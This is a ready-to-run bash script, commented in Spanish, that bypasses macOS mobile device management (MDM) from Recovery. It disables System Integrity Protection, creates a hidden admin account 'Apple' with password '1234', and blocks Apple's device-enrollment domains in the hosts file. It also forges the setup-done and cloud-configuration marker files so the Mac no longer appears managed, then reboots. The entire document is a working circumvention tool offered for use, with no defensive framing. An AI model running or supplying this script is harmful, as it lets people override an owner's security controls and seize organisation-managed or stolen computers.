#!/bin/bash
clear
echo "=================================================="
echo "      BYPASS MDM AUTOMATICO (A PRUEBA DE FALLOS)  "
echo "=================================================="

# 1. DETECCIÓN BLINDADA DE VOLÚMENES
SYS_VOL=""
DATA_VOL=""

echo "Buscando el disco duro real (ignorando Recovery)..."
for v in /Volumes/*; do
  # Ignoramos explícitamente el disco de Recovery
  if [[ "$v" != *"Base System"* ]]; then
    # El volumen del sistema tiene /System/Library
    if [ -d "$v/System/Library" ]; then 
      SYS_VOL="$v"
    fi
    # El volumen de datos tiene la base de datos de usuarios
    if [ -d "$v/private/var/db/dslocal" ]; then 
      DATA_VOL="$v"
    fi
  fi
done

if [ -z "$SYS_VOL" ] || [ -z "$DATA_VOL" ]; then
  echo "ERROR: No se pudo encontrar el disco real. ¿El disco está bloqueado por FileVault?"
  echo "Ve a Utilidad de Discos, monta el disco y vuelve a intentarlo."
  exit 1
fi

echo "✓ Volumen Sistema: $SYS_VOL"
echo "✓ Volumen Datos:   $DATA_VOL"
echo ""

# 2. DESACTIVAR SIP (Necesario para poder crear el usuario)
echo "Desactivando SIP (System Integrity Protection)..."
csrutil disable 2>/dev/null
echo "✓ SIP Desactivado (se aplicará al reiniciar)."
echo ""

# 3. CREAR EL USUARIO
echo "Creando usuario 'Apple'..."
DSCL="$DATA_VOL/private/var/db/dslocal/nodes/Default"

# Creamos el usuario y todos sus atributos
dscl -f "$DSCL" localhost -create "/Local/Default/Users/Apple"
dscl -f "$DSCL" localhost -create "/Local/Default/Users/Apple" UserShell "/bin/zsh"
dscl -f "$DSCL" localhost -create "/Local/Default/Users/Apple" RealName "Apple"
dscl -f "$DSCL" localhost -create "/Local/Default/Users/Apple" UniqueID "501"
dscl -f "$DSCL" localhost -create "/Local/Default/Users/Apple" PrimaryGroupID "20"
dscl -f "$DSCL" localhost -create "/Local/Default/Users/Apple" NFSHomeDirectory "/Users/Apple"
dscl -f "$DSCL" localhost -passwd "/Local/Default/Users/Apple" "1234"
dscl -f "$DSCL" localhost -append "/Local/Default/Groups/admin" GroupMembership "Apple"

# Creamos su carpeta de inicio
mkdir -p "$DATA_VOL/Users/Apple"
echo "✓ Usuario y carpeta creados."
echo ""

# 4. BLOQUEAR DOMINIOS MDM
echo "Bloqueando dominios de MDM..."
HOSTS="$SYS_VOL/etc/hosts"
# Aseguramos que el archivo exista
touch "$HOSTS" 2>/dev/null

# Agregamos los dominios si no existen ya
grep -q "deviceenrollment.apple.com" "$HOSTS" || echo "0.0.0.0 deviceenrollment.apple.com" >> "$HOSTS"
grep -q "mdmenrollment.apple.com" "$HOSTS" || echo "0.0.0.0 mdmenrollment.apple.com" >> "$HOSTS"
grep -q "iprofiles.apple.com" "$HOSTS" || echo "0.0.0.0 iprofiles.apple.com" >> "$HOSTS"
echo "✓ Dominios bloqueados."
echo ""

# 5. CREAR ARCHIVOS DE BYPASS
echo "Aplicando configuraciones finales..."
CONFIG="$SYS_VOL/var/db/ConfigurationProfiles/Settings"
mkdir -p "$CONFIG"

# Ocultar el asistente de bienvenida para que vaya directo al escritorio
touch "$DATA_VOL/private/var/db/.AppleSetupDone"

# Crear y eliminar los archivos que le dicen a macOS que ya está gestionado
rm -rf "$CONFIG/.cloudConfigHasActivationRecord"
rm -rf "$CONFIG/.cloudConfigRecordFound"
touch "$CONFIG/.cloudConfigProfileInstalled"
touch "$CONFIG/.cloudConfigRecordNotFound"
echo "✓ Configuraciones aplicadas."
echo ""

echo "=================================================="
echo "      ¡BYPASS COMPLETADO CON ÉXITO!               "
echo "=================================================="
echo "  El sistema se reiniciará en 5 segundos..."
echo "  Cuando encienda, entra con:"
echo "  Usuario: Apple"
echo "  Contraseña: 1234"
echo "=================================================="

# Reiniciar automáticamente para aplicar cambios
sleep 5
reboot
